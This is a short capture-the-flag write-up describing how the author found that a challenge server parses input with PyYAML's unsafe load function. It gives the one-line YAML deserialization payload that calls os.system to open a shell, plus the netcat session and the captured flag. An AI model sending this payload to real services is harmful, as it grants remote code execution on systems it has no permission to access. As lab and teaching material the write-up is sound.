
# Bet3
This time we're introduced with a slightly different server. When typing most stuff into netcat, the server responds with dots? Seems like we're constructing some sort of long syntax. After playing with it for a minute or two, I tried to reply to the server with dots as well:

    root@beer:~/crypto# nc ctf.safebreach.com 31339
	...
	...
	 while parsing a block node
	expected the node content, but found '<document end>'
	  in "<unicode string>", line 1, column 1:

Huh? That's a strange error. Seems like our server is parsing some sort of document. The error seemed Pythonic but I could not recognize it. Naturally I googled the error and figured out it was actually the `yaml` python module.

For those who are not familiar with the module, it's a module for parsing YAML syntax. There are two primary functions in that module for parsing YAML syntax: `load` and `safe_load`. This was obviously just `load`, and we needed to achieve code execution by sending malicious YAML syntax.

Upon reading on the issue online, I came across [this page](https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load%28input%29-Deprecation) which explains it pretty nicely, and provides a small POC which we can use to solve this challenge:

    root@beer:~/crypto# nc ctf.safebreach.com 31339
	!!python/object/new:os.system [/bin/sh]
	 /bin/sh: can't access tty; job control turned off
	/pwn $ cat flag
	CTF{4ab256a740b1001a8pf387d7d668bf45}
